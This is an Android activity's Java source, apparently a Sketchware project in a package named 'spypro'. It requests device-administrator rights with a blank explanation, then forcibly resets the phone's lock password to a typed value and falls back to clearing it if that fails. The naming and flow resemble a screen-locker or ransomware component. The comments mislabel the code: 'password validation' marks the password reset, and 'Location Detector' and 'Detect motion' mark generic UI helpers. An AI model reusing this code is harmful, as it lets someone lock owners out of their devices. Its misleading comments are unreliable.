package com.spypro.citad.techie;
// All imported Java Packages

import android.app.Activity;
import android.app.*;
import android.os.*;
import android.view.*;
import android.view.View.*;
import android.widget.*;
import android.content.*;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.webkit.*;
import android.animation.*;
import android.view.animation.*;
import java.util.*;
import java.util.regex.*;
import java.text.*;
import org.json.*;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.view.View;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.app.Fragment;
import android.app.FragmentManager;
import android.app.DialogFragment;
import android.app.admin.DevicePolicyManager;

// By MainActivity Starting point
public class MainActivity extends Activity {
	
	private String message = "";
	// Inialization of the widgets
	private LinearLayout linear1;
	private LinearLayout linear2;
	private TextView textview1;
	private LinearLayout linear3;
	private Button button1;
	private EditText edittext1;
	private Button button2;
	private ImageView imageview1;
	
	// Oncreate Method
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.main);
		initialize(_savedInstanceState);
		initializeLogic();
	}
	// Connecting all Views from XML
	private void initialize(Bundle _savedInstanceState) {
		linear1 = (LinearLayout) findViewById(R.id.linear1);
		linear2 = (LinearLayout) findViewById(R.id.linear2);
		textview1 = (TextView) findViewById(R.id.textview1);
		linear3 = (LinearLayout) findViewById(R.id.linear3);
		button1 = (Button) findViewById(R.id.button1);
		edittext1 = (EditText) findViewById(R.id.edittext1);
		button2 = (Button) findViewById(R.id.button2);
		imageview1 = (ImageView) findViewById(R.id.imageview1);
		
		// Request permission from the phone
		button1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				message = "message";
				Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN); intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName); intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,message); startActivityForResult(intent, RESULT_ENABLE);
			}
		});
		
		// Check if the permission accepted
		button2.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				if (_isDeviceAdmin()) {
					_change(edittext1.getText().toString());
				}
				else {
					SketchwareUtil.showMessage(getApplicationContext(), "accept permission ....");
				}
			}
		});
	}
	// Lock the device if the permission accepted
	private void initializeLogic() {
		devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
		activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
		compName = new ComponentName(this, DeviceAdminSample.class);
	}
	
	@Override
	protected void onActivityResult(int _requestCode, int _resultCode, Intent _data) {
		super.onActivityResult(_requestCode, _resultCode, _data);
		switch (_requestCode) {
			
			default:
			break;
		}
	}
	
	// Tile view import
	public void _ArabWare () {
	}
	public static final int RESULT_ENABLE = 11;
	private DevicePolicyManager devicePolicyManager;
	private ActivityManager activityManager; private ComponentName compName;
	{
	}
	
	// password validation method
	public void _change (final String _to) {
		try {
			devicePolicyManager.setPasswordQuality(compName ,DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED); devicePolicyManager.setPasswordMinimumLength(compName, 5); boolean result = devicePolicyManager.resetPassword(_to, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
		} catch(Exception e) {
			devicePolicyManager.setPasswordMinimumLength(compName, 0); boolean result = devicePolicyManager.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
			devicePolicyManager.setPasswordQuality(compName ,DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED); devicePolicyManager.setPasswordMinimumLength(compName, 5); result = devicePolicyManager.resetPassword(_to, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
			SketchwareUtil.showMessage(getApplicationContext(), e.getMessage());
			((ClipboardManager) getSystemService(getApplicationContext().CLIPBOARD_SERVICE)).setPrimaryClip(ClipData.newPlainText("clipboard", e.getMessage()));
		}
	}
	
	// Device policy management don't edit
	public boolean _isDeviceAdmin () {
		return devicePolicyManager.isAdminActive(compName);
	}
	
	
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	// Location Detector
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	// Detect motion 
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input) {
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels() {
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels() {
		return getResources().getDisplayMetrics().heightPixels;
	}
}
